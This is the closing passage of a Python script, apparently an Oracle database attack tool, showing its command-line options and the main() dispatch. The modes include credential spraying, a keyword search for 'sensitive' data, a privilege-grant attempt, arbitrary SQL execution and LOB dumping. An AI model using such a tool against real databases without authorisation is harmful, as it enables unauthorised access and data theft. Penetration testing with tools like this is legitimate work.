    enum_group.add_argument("--search-terms", default=DEFAULT_SENSITIVE_TERMS, help="Keywords for 'sensitive' search")
    enum_group.add_argument("-g", "--grant-catalog-role", action="store_true", help="Attempt to grant SELECT_CATALOG_ROLE (AUDITED!)")
    enum_group.add_argument("-o", "--output", default="excel", help="Formats: excel,csv,json")
    enum_group.add_argument("-O", "--outdir", default=".", help="Directory for result files")
    query_group = p.add_argument_group("Direct Query Mode")
    query_group.add_argument("-q", "--query", metavar="SQL", help="Execute a single query and print results.")
    query_group.add_argument("-i", "--interactive", action="store_true", help="Enter an interactive SQL shell.")
    query_group.add_argument("--force", action="store_true", help="Allow non-SELECT queries with -q (DANGEROUS).")
    query_group.add_argument("--dump-lobs", action="store_true", help="For queries with LOBs (BLOB/CLOB), dump content to files.")
    p.add_argument("-L", "--log-file", help="Save verbose output to a log file.")
    p.add_argument("-v", "--verbose", action="count", default=0, help="Increase verbosity (-v for INFO, -vv for DEBUG)")
    return p

def main(argv: List[str] | None = None):
    args = build_parser().parse_args(argv)
    log_level = logging.INFO if args.verbose == 1 else (logging.DEBUG if args.verbose >= 2 else logging.WARNING)
    log_handlers = [logging.StreamHandler(sys.stdout)]
    if args.log_file:
        try:
            log_handlers.append(logging.FileHandler(args.log_file))
        except (IOError, OSError) as e:
            print(f"Error: Could not open log file '{args.log_file}'. {e}", file=sys.stderr)
            sys.exit(1)
    logging.basicConfig(level=log_level, format="%(asctime)s [%(levelname)s] %(message)s", datefmt="%Y-%m-%d %H:%M:%S", handlers=log_handlers)

    all_dsns = []
    if args.dsn_list: all_dsns.extend(split_csv(args.dsn_list))
    if args.dsn: all_dsns.append(args.dsn)
    if args.dsn_file: all_dsns.extend(read_file_lines(args.dsn_file))
    args.dsn_list = ",".join(list(dict.fromkeys(all_dsns)))

    creds = generate_login_combos(args)
    if not creds:
        logging.warning("No valid credential combinations to test.")
        return

    is_spray_mode = args.users_file or args.login_user
    is_query_mode = args.query
    is_interactive_mode = args.interactive

    if is_spray_mode:
        handle_spraying(creds, args)
    elif is_interactive_mode:
        handle_interactive_query(creds, args)
    elif is_query_mode:
        handle_direct_query(creds, args)
    else:
        handle_enumeration(creds, args)

if __name__ == "__main__":
    main()
